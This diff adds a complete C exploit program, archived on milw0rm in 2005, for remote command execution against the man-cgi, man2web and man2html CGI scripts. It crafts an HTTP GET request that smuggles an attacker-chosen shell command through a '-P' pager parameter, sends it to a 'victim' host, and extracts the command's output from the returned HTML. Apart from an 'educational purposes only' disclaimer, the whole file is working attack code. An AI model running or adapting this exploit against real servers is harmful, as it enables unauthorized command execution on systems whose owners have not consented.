@@ -1,0 +1,153 @@
+/*
+ * str0ke@server:~$ ./test some.edu "w" /cgi-bin/man2web 80 1
+ * /str0ke
+ */
+ 
+ /* dl-mancgi.c v0.2
+  * x86/linux multipie man2web cgi-scripts remote command spawn
+  * found and coded by tracewar	(darklogic team)		 
+  * for educaional purposes only.                                  
+  *****************************************************************	
+  * greetz goes to:						
+  * matan peretz, ofer shaked, setuid, alex, majestic 
+  */
+ 
+ 
+ #include <stdio.h>
+ #include <sys/types.h>
+ #include <sys/socket.h>
+ #include <netinet/in.h>
+ #include <netdb.h>
+ 
+ void usage(char *argv0) {
+         fprintf(stderr, "x86/linux multipie man2web cgi-scripts remote command spawn\n");
+ 	fprintf(stderr, "researched by tracewar\n");
+ 	fprintf(stderr, "targets: \n0=man-cgi\n1=man2web\n2=man2html\n\n");
+ 	fprintf(stderr, "usage: %s <remote_host> <command> <path> <http server port> <target>\n", argv0);
+         fprintf(stderr, "example:");
+ 	fprintf(stderr, " %s 1.2.3.4 w /cgi-bin/man-cgi 80 0\n",argv0);
+         exit(0);
+ }
+ 
+ int main(int argc, char **argv) {
+         int sock, i, j, len = 0;
+         struct sockaddr_in serv_addr;
+         struct hostent *crap;
+ 	char *cp, dummy[50000], buffer[2000] = "GET ";	
+         if(argc < 6)
+            usage(argv[0]);
+ 	if(atoi(argv[5]) == 0) {
+ 			memset(dummy, 0x00, 50000);
+ 			strcat(dummy, argv[3]);
+ 			strcat(dummy, "?-P ");
+ 			strcat(dummy, argv[2]);
+ 			strcat(dummy, " ls");} 
+ 	else if(atoi(argv[5]) == 1) {
+               		memset(dummy, 0x00, 50000);
+              		strcat(dummy, argv[3]);
+             	 	strcat(dummy, "?program=-P ");
+            	        strcat(dummy, argv[2]);
+            	        strcat(dummy, " ls");}
+ 	else if(atoi(argv[5]) == 2) {
+ 			memset(dummy, 0x00, 50000);
+ 			strcat(dummy, argv[3]);
+ 			strcat(dummy, "?section=-P");
+ 			strcat(dummy, argv[2]);
+ 			strcat(dummy, "&topic=w");}
+ 	else
+ 		usage(argv[0]);
+ 
+ 	printf("# crafting buffer string ... ");
+          for(i=0, j=4;i < strlen(dummy);i++) {
+ 		if(dummy[i] == ' ') {
+ 			strcat(buffer, "%20");
+ 			j+=3;}
+ 		else {
+ 			buffer[j] = dummy[i];
+ 			j++;}
+ 	}
+         
+ 	strcat(buffer, "\r\n");
+         printf("(done)\n");
+         sock = socket(AF_INET, SOCK_STREAM, 0);
+         if(sock < 0)
+                 return printf("# error creating socket.\n");
+         crap = gethostbyname(argv[1]);
+         if(crap == NULL)
+                 return printf("# cant resolve the specified hostname: %s\n", argv[1]);
+         else
+                 printf("# connecting to victim... ");
+ 
+         serv_addr.sin_family = AF_INET;
+ 	serv_addr.sin_port = htons(atoi(argv[4]));
+         bcopy((char *)crap->h_addr, (char *)&serv_addr.sin_addr.s_addr, crap->h_length);
+ 
+         if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0)
+                 return printf("(error)\n# check again %s:%d\n", argv[1], atoi(argv[3]));
+ 
+         printf("(done)\n# sending crafted string... ");
+         if( (send(sock, buffer, strlen(buffer), 0)) == -1 )
+                 return printf("\n# error while sending the crafted string.!\n");
+         printf("(done)\n# waiting for our call ...\n");
+ 	memset(buffer, 0x00, 2000);
+ 	memset(dummy, 0x00, 50000);
+ 	printf("\n\n");
+ 	while(recv(sock, buffer, 2000, 0) > 0)
+ 		strcat(dummy, buffer);
+ 
+ 	cp = &dummy[0];
+ 	i = 0; j = 0;
+ 	len = strlen(dummy);
+ 
+         if(atoi(argv[5]) == 0) {
+                 while(strncmp(cp, "<hr>", 4) && i < len) {
+                         cp++;
+                         i++;
+                 }
+                 cp+=4;
+                 while(strncmp(cp, "<hr>", 4) && strncmp(cp, "<A", 2) && j < len) {
+ 			j++;
+                         cp++;
+ 		}
+                 *cp = '\0';
+                 cp = &dummy[0] + i + 4;
+         }
+ 
+         else if(atoi(argv[5]) == 1) {
+                 while(strncmp(cp, "\<pre\>", 5) && i < len) {
+                         cp++;
+                         i++;
+                 }
+                 cp+=4;
+                 while(strncmp(cp, "pre", 3) && j < len) {
+ 			j++;
+                         cp++;
+ 		}
+                 *cp = '\0';
+                 cp = &dummy[0] + i + 6;
+         }
+ 
+         else if(atoi(argv[5]) == 2) {
+                 while(strncmp(cp, "PRE", 3) && i < len) {
+                         cp++;
+                         i++;
+                 }
+                 cp+=2;
+                 while(strncmp(cp, "PRE", 3) && j < len) {
+ 			j++;
+                         cp++;
+ 		}
+                 *cp = '\0';
+                 cp = &dummy[0] + i + 2;
+         }
+ 
+ 	if(*cp == '\0')
+ 		return printf("# Bad response from the server.\n");
+ 
+         printf("%s", cp);
+ 	printf("\n\n");
+         close(sock);
+         return 0;
+ }
+
+// milw0rm.com [2005-09-04]
